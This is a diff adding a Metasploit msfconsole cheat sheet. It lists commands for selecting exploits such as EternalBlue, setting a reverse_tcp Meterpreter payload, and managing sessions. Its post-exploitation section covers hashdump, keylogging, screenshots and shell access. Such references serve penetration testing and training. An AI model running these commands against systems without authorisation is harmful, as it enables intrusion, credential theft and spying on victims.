@@ -1,0 +1,56 @@
+============================
+Metasploit msfconsole Commands
+============================
+
+1. Starting and Basic Navigation
+-------------------------------
+msfconsole               # Start Metasploit console
+help                    # Show all available commands
+?                       # Same as help
+banner                  # Show a random banner
+version                 # Show Metasploit version
+exit                    # Exit Metasploit
+quit                    # Same as exit
+
+2. Module Searching and Usage
+-------------------------------
+search <keyword>        # Search for exploit/module (e.g., search smb)
+use <module_path>       # Use selected module (e.g., use exploit/windows/smb/ms17_010_eternalblue)
+info                    # Show detailed information about the current module
+show options            # Show required/optional options for the module
+show payloads           # List compatible payloads for current exploit
+set <option> <value>    # Set module parameter (e.g., set RHOST 192.168.1.10)
+unset <option>          # Unset a module parameter
+check                   # Check if the target is vulnerable (if supported)
+
+3. Payloads and Exploitation
+-------------------------------
+set PAYLOAD <payload>   # Set the payload (e.g., set PAYLOAD windows/meterpreter/reverse_tcp)
+set LHOST <IP>          # Set local host IP for reverse connection
+set LPORT <port>        # Set local port to listen on
+exploit                 # Run the exploit
+run                     # Same as exploit
+exploit -j              # Run exploit in background as a job
+
+4. Session Management
+-------------------------------
+sessions                # List all active sessions
+sessions -i <id>        # Interact with a specific session
+background              # Send session to background
+kill <id>               # Kill a specific session
+
+5. Meterpreter Commands (Post-Exploitation)
+-------------------------------
+sysinfo                 # Get system information
+getuid                  # Get user ID
+hashdump                # Dump password hashes (requires privilege)
+keyscan_start           # Start keylogger
+keyscan_dump            # Dump keystrokes
+screenshot              # Take screenshot of victim’s desktop
+shell                   # Drop into system shell
+
+6. Useful Auxiliary Modules
+-------------------------------
+use auxiliary/scanner/portscan/tcp           # TCP port scanner
+use auxiliary/scanner/smb/smb_version        # Detect SMB version
+use auxiliary/admin/smb/smb_enumusers        # Enumerate SMB users
